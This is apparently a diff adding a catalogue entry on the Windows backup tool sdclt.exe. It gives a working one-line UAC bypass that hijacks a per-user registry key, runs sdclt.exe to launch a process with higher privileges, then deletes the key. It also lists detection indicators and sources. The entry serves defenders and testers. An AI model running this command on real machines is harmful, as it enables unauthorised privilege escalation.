@@ -1,0 +1,33 @@
+---
+Name: sdclt.exe
+Description: "sdclt.exe" is the process for the Vista backup tool (under Accessories > System Tools). It is used to both back up and restore files that you specify.
+Author: 'lobs'
+Created: '2019-10-03'
+Commands:
+  - Command: reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c notepad.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f && %windir%\system32\sdclt.exe && reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
+    Description: Manipulates the regkey to launch a privileged notepad.exe, executes sdclt.exe triggering the bypass and then removes the regkey. 
+    Usecase: An attacker can create a process with higher local privileges
+    Category: UAC bypass
+    Privileges: User
+    MitreID: T1088
+    MitreLink: https://attack.mitre.org/techniques/T1088/
+    OperatingSystem: Windows Vista+
+Full_Path:
+  - Path: c:\windows\system32\sdclt.exe
+Code_Sample: 
+  - Code:
+Detection: 
+  - IOC: regmod:\Software\Classes\exefile\shell\runas\command\isolatedCommand
+  - IOC: regmod:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe
+  - IOC: regmod:\Software\Classes\Folder\shell\open\command
+  - IOC: (process_name:sdclt.exe AND cmdline:/kickoffelev)
+Resources:
+  - Link: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
+  - Link: https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
+  - Link: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
+Acknowledgement:
+  - Person: Matt Nelson
+    Handle: @enigma0x3
+  - Person: Emeric Nasi
+    Handle: @EmericNasi
+---
